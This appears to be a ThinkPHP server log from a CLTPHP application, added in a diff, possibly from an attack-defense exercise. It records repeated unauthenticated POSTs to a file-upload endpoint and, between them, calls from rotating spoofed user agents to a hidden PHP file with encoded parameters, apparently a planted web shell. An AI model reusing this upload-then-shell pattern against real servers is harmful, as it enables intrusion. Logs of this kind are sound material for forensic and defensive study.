+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000360s ] mysql:host=127.0.0.1;port=3306;dbname=cltphp51_db;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `clt_users` [ RunTime:0.000739s ]
+[ sql ] [ SQL ] SELECT `u`.*,`ul`.`level_name` FROM `clt_users` `u` LEFT JOIN `clt_user_level` `ul` ON `u`.`level`=`ul`.`level_id` WHERE  `u`.`id` IS NULL LIMIT 1 [ RunTime:0.000237s ]
+---------------------------------------------------------------
+[ 2018-07-05T23:54:20+08:00 ] 172.17.0.1 POST //.928e14c9854929ed80a1be176de90b9b.php
+[ info ] 127.0.0.1:80//.928e14c9854929ed80a1be176de90b9b.php [运行时间：0.037065s][吞吐率：26.98req/s] [内存消耗：303.47kb] [文件加载：33]
+[ info ] [ LANG ] /var/www/html/think/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '.928e14c9854929ed80a1be176de90b9b.php',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '127.0.0.1:80',
+  'accept-encoding' => 'identity',
+  'content-length' => '75',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'user-agent' => 'Mozilla/5.0 (compatible; bingbot/2.0  http://www.bing.com/bingbot.htm)',
+)
+[ info ] [ PARAM ] array (
+  'a' => 'p3ymqTIg',
+  'b' => 'MJAbolObMJkfZSpjpwSxBj==',
+  'hash' => '9b0910f56ed3b758c7f382ae2fe7b52f',
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-07-05T23:54:20+08:00 ] 172.17.0.1 POST /index.php/user/upFiles/upload
+[ info ] 127.0.0.1/index.php/user/upFiles/upload [运行时间：0.048388s][吞吐率：20.67req/s] [内存消耗：596.98kb] [文件加载：48]
+[ info ] [ LANG ] /var/www/html/think/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'user',
+    1 => 'upFiles',
+    2 => 'upload',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '127.0.0.1',
+  'connection' => 'keep-alive',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => '*/*',
+  'user-agent' => 'python-requests/2.18.4',
+  'x-requested-with' => 'XMLHttpRequest',
+  'content-length' => '191',
+  'content-type' => 'multipart/form-data; boundary=6cfc8e8e680b4b29af1a24387bca2dd0',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\user\controller\UpFiles->upload[ /var/www/html/app/user/controller/UpFiles.php ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000556s ] mysql:host=127.0.0.1;port=3306;dbname=cltphp51_db;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `clt_users` [ RunTime:0.000910s ]
+[ sql ] [ SQL ] SELECT `u`.*,`ul`.`level_name` FROM `clt_users` `u` LEFT JOIN `clt_user_level` `ul` ON `u`.`level`=`ul`.`level_id` WHERE  `u`.`id` IS NULL LIMIT 1 [ RunTime:0.000397s ]
+---------------------------------------------------------------
+[ 2018-07-05T23:54:22+08:00 ] 172.17.0.1 POST //.928e14c9854929ed80a1be176de90b9b.php
+[ info ] 127.0.0.1:80//.928e14c9854929ed80a1be176de90b9b.php [运行时间：0.056734s][吞吐率：17.63req/s] [内存消耗：303.54kb] [文件加载：33]
+[ info ] [ LANG ] /var/www/html/think/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '.928e14c9854929ed80a1be176de90b9b.php',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '127.0.0.1:80',
+  'accept-encoding' => 'identity',
+  'content-length' => '75',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:35.0) Gecko/20100101 Firefox/35.0',
+)
+[ info ] [ PARAM ] array (
+  'a' => 'p3ymqTIg',
+  'b' => 'MJAbolObMJkfZSpjpwSxBj==',
+  'hash' => '9b0910f56ed3b758c7f382ae2fe7b52f',
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-07-05T23:54:22+08:00 ] 172.17.0.1 POST /index.php/user/upFiles/upload
+[ info ] 127.0.0.1/index.php/user/upFiles/upload [运行时间：0.067066s][吞吐率：14.91req/s] [内存消耗：596.98kb] [文件加载：48]
+[ info ] [ LANG ] /var/www/html/think/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'user',
+    1 => 'upFiles',
+    2 => 'upload',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '127.0.0.1',
+  'connection' => 'keep-alive',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => '*/*',
+  'user-agent' => 'python-requests/2.18.4',
+  'x-requested-with' => 'XMLHttpRequest',
+  'content-length' => '191',
+  'content-type' => 'multipart/form-data; boundary=1b2f207061eb470d8afe8346df87f8a3',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\user\controller\UpFiles->upload[ /var/www/html/app/user/controller/UpFiles.php ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000348s ] mysql:host=127.0.0.1;port=3306;dbname=cltphp51_db;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `clt_users` [ RunTime:0.000935s ]
+[ sql ] [ SQL ] SELECT `u`.*,`ul`.`level_name` FROM `clt_users` `u` LEFT JOIN `clt_user_level` `ul` ON `u`.`level`=`ul`.`level_id` WHERE  `u`.`id` IS NULL LIMIT 1 [ RunTime:0.000244s ]
+---------------------------------------------------------------
+[ 2018-07-05T23:54:50+08:00 ] 172.17.0.1 POST //.928e14c9854929ed80a1be176de90b9b.php
+[ info ] 127.0.0.1:80//.928e14c9854929ed80a1be176de90b9b.php [运行时间：0.043445s][吞吐率：23.02req/s] [内存消耗：303.91kb] [文件加载：33]
+[ info ] [ LANG ] /var/www/html/think/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '.928e14c9854929ed80a1be176de90b9b.php',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '127.0.0.1:80',
+  'accept-encoding' => 'identity',
+  'content-length' => '75',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'user-agent' => 'Mozilla/5.0 (iPhone; U; CPU iPhone OS 5_1_1 like Mac OS X; da-dk) AppleWebKit/534.46.0 (KHTML, like Gecko) CriOS/19.0.1084.60 Mobile/9B206 Safari/7534.48.3',
+)
+[ info ] [ PARAM ] array (
+  'a' => 'p3ymqTIg',
+  'b' => 'MJAbolObMJkfZSpjpwSxBj==',
+  'hash' => '9b0910f56ed3b758c7f382ae2fe7b52f',
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-07-05T23:54:50+08:00 ] 172.17.0.1 POST /index.php/user/upFiles/upload
+[ info ] 127.0.0.1/index.php/user/upFiles/upload [运行时间：0.066255s][吞吐率：15.09req/s] [内存消耗：596.98kb] [文件加载：48]
+[ info ] [ LANG ] /var/www/html/think/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'user',
+    1 => 'upFiles',
+    2 => 'upload',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '127.0.0.1',
+  'connection' => 'keep-alive',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => '*/*',
+  'user-agent' => 'python-requests/2.18.4',
+  'x-requested-with' => 'XMLHttpRequest',
+  'content-length' => '191',
+  'content-type' => 'multipart/form-data; boundary=b9891c8cfa11484f892e795c79974992',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\user\controller\UpFiles->upload[ /var/www/html/app/user/controller/UpFiles.php ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000461s ] mysql:host=127.0.0.1;port=3306;dbname=cltphp51_db;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `clt_users` [ RunTime:0.001092s ]
+[ sql ] [ SQL ] SELECT `u`.*,`ul`.`level_name` FROM `clt_users` `u` LEFT JOIN `clt_user_level` `ul` ON `u`.`level`=`ul`.`level_id` WHERE  `u`.`id` IS NULL LIMIT 1 [ RunTime:0.000477s ]
